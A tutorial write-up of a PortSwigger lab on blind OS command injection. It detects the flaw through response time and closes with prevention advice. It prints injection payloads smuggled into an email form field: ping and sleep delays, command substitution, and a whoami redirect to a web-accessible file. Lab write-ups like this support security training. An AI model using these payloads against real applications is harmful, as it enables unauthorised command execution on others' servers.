# Command Injection - Lab #2: Blind OS Command Injection with Time Delays

**YouTube Tutorial:** [Command Injection - Lab #2 Blind OS command injection with time delays (Short Version)](https://youtu.be/YHQXfPWo1vI)

---

## 1. What is Blind OS Command Injection with Time Delays?

### Core Concept

This lab is a **blind command injection** — the application executes a shell command containing user-supplied input, but the **command output is never returned** in the HTTP response. There is no error message, no rendered result, and no visible change in the page. Traditional in-band detection (`whoami` and reading the output) will not work here.

**Time-Delay Blind Command Injection** overcomes this by injecting a command that makes the server **pause for a measurable period** — if the injection worked, the HTTP response takes ~10 seconds; if not, it returns instantly:

* **Successful injection:** The shell executes `ping -c 10 127.0.0.1`, which pings the loopback address 10 times (~1 second each) → **response takes ~10 seconds**.
* **Failed injection:** The command never runs → response returns **immediately (~200 ms)**.

By observing response time, an attacker confirms the command was executed — no output needed:

```
            NORMAL REQUEST                            INJECTED REQUEST
   ┌────────────────────────────┐          ┌────────────────────────────┐
   │  email = x@example.com     │          │  email = x||ping -c 10     │
   │                            │          │         127.0.0.1||        │
   └─────────────┬──────────────┘          └─────────────┬──────────────┘
                 │                                       │
                 ▼                                       ▼
   ┌────────────────────────────┐          ┌────────────────────────────┐
   │  mail.sh x@example.com ... │          │  mail.sh x||ping -c 10     │
   │  (runs, output discarded)  │          │  127.0.0.1|| ...           │
   └─────────────┬──────────────┘          └─────────────┬──────────────┘
                 │                                       │
                 ▼                                       ▼
   ┌────────────────────────────┐          ┌────────────────────────────┐
   │  Response: IMMEDIATE       │          │  Shell executes:           │
   │  (~200 ms)                 │          │  ping -c 10 127.0.0.1      │
   │  = NO delay = no injection │          │  (10 ICMP packets ≈ 10s)   │
   └────────────────────────────┘          └─────────────┬──────────────┘
                                                         │
                                                         ▼
                                          ┌────────────────────────────┐
                                          │  Response: AFTER ~10 SEC   │
                                          │  = delay = command ran ✅  │
                                          └────────────────────────────┘
```

The **response time itself is the oracle** — no data comes back, only time.

---

## 2. Attack Overview & Key Concepts

### Vulnerability Explanation

* **Vulnerable Feature:** The **feedback form** (Submit feedback) — fields: `name`, `email`, `subject`, `message`.
* **Vulnerable Parameter:** `email` (confirmed in Rana's video and the official solution; the other fields can also be tested).
* **Blind Command Injection Mechanism:** The application executes a shell command containing the user-supplied email value, but **discards the command output** — the HTTP response is identical regardless of what the command does.
* **Detection Channel:** **Response time** — a successful injection forces the server to wait ~10 seconds before replying.
* **End Goal:** Cause a **10-second delay** in the response to prove command execution and solve the lab.

### Root Cause & Impact

* **Root Cause:** User-controlled form input is concatenated into an OS shell command (e.g., a mail/sendmail script) with no sanitization or allow-listing.
* **Impact:** Arbitrary command execution as the web server user — even though output is hidden, the attacker can still run commands, redirect output to web-accessible files, or trigger out-of-band (DNS) interactions.
* **End Goal:** Exploit the blind injection to cause a 10-second delay and solve the lab.

---

## 3. Attack Methods & Techniques

### Method Details

* **Phase 1 (Capture the Feedback Request):** Fill in and submit the feedback form, intercept the `POST /feedback/submit` request in **Burp Proxy**, and send it to **Repeater**.
* **Phase 2 (Identify the Injectable Parameter):** Test each parameter (`name`, `email`, `subject`, `message`) with a delay payload. The **`email`** parameter is the vulnerable one.
* **Phase 3 (Inject a Time-Delay Command):** Use the pipe separator `||` to append `ping -c 10 127.0.0.1` to the existing command.
* **Phase 4 (Measure the Response Time):** Send the request and confirm the response takes ~10 seconds. A 10-second delay = command executed = lab solved.

### Server Behavior

* **Normal request:** HTTP response returns **immediately (~200 ms)**.
* **Successful time-delay injection:** HTTP response returns after **~10 seconds**.
* **Injected command output:** Never visible in the response (blind) — time is the only signal.

---

## 4. Step-by-Step Walkthrough

### Step 1: Intercept the Feedback Submission Request

1. In the lab, click **"Submit feedback"** and fill the form with dummy values:

```
Name:      test
Email:     test@example.com
Subject:   test
Message:   test
```

2. Submit the form with **Burp Proxy interception ON**.
3. Send the captured `POST /feedback/submit` request to **Repeater**.

```http
POST /feedback/submit HTTP/1.1
Host: [LAB-ID].web-security-academy.net
Content-Type: application/x-www-form-urlencoded
Cookie: session=[SESSION-COOKIE]

csrf=[CSRF-TOKEN]&name=test&email=test%40example.com&subject=test&message=test
```

### Step 2: Find the Injectable Parameter

1. Test each parameter one at a time with a harmless delay payload.
2. Start with `email` (the known-vulnerable one per the official solution).

### Step 3: Inject the Time-Delay Payload (Official Solution)

1. Replace the `email` value with:

```http
email=x||ping+-c+10+127.0.0.1||
```

2. The full request line looks like:

```http
POST /feedback/submit HTTP/1.1
Host: [LAB-ID].web-security-academy.net
Content-Type: application/x-www-form-urlencoded
Cookie: session=[SESSION-COOKIE]

csrf=[CSRF-TOKEN]&name=test&email=x||ping+-c+10+127.0.0.1||&subject=test&message=test
```

* **Injected payload:** `x||ping -c 10 127.0.0.1||`
* **Why it works:** The `||` operator runs the right-hand command if the left-hand command fails (the bogus `x` command fails), so the shell executes `ping -c 10 127.0.0.1` — pinging localhost 10 times, once per second.

### Step 4: Measure the Response Time

1. Send the request from Repeater.
2. **Result:** The response takes **approximately 10 seconds** to return.
3. The lab banner updates to **"Congratulations, you solved the lab!"**.

### Alternative Payloads (Also Work)

```http
email=x;sleep 10#          # Linux: sleep 10s, # comments out trailing args
email=x&ping+-c+10+127.0.0.1&   # & background + run ping
email=x||ping+-c+10+localhost|| # localhost instead of 127.0.0.1
email=`sleep 10`                # command substitution
email=$(sleep 10)               # command substitution (bash)
```

> **Rana's video tip:** The `sleep` command (`sleep 10`) is the simplest delay on Linux, but `ping -c 10 127.0.0.1` is more portable (works even where `sleep` flags differ, e.g. Windows) and is the officially documented payload.

---

## 5. Pro-Tips & Common Pitfalls

* **URL-encode the payload:** In form bodies, `&`, `|`, and spaces are special. The official payload uses `+` for spaces and bare `||` (no encoding needed for `|` in this case). If your request breaks, highlight → **Ctrl+U** to URL-encode (`%7c%7c`, `%26`).
* **Test all four parameters:** The feedback form has `name`, `email`, `subject`, `message`. The official solution targets `email`, but testing each parameter identifies the true injection point and is good practice.
* **`ping -c 10 127.0.0.1` = ~10 seconds:** `ping` sends one packet immediately, then one per second — 10 packets ≈ 10 seconds. Use `-c 11` if you need a slightly longer, guaranteed 10-second+ delay.
* **`||` vs `;` vs `&`:** `||` runs the command only if the previous one fails — ideal here because `x` is a fake command that always fails. `;` always runs the next command. `&` backgrounds the previous command. Pick based on how the shell command is constructed.
* **`#` comments out the rest:** If trailing arguments in the shell command cause errors after your injected command, append `#` (Linux) to comment them out.
* **Blind means no output — never look for output:** There is no `whoami` output in this lab. Time is the only proof. A ~10-second response = success.
* **No Burp Pro required:** Repeater's response-time display (or `curl -w %{time_total}` / Python `requests.elapsed`) is all you need — fully solvable with **Burp Suite Community Edition**.
* **If you want the real username (practice, not required):** Redirect output to a web-accessible file — e.g. `email=x||whoami>/var/www/images/output.txt||` — then fetch `/images/output.txt`. This is the technique used in Lab #3.
* **The vulnerable backend pattern:**

```php
// ❌ VULNERABLE — blind command injection
$cmd = "mail " . escapeshellarg($email) . " ...";  // note: even escapeshellarg isn't enough here
// or worse:
system("sendmail " . $email);

// ✅ SAFE — avoid shell calls entirely; use a mail library with native APIs
```

* **Prevention summary:**
  * Never call OS commands from application code.
  * If unavoidable, use argument-array APIs (no shell) and strict allow-list validation of every field.
  * Run the app as a low-privilege user and block egress (DNS/HTTP) where possible.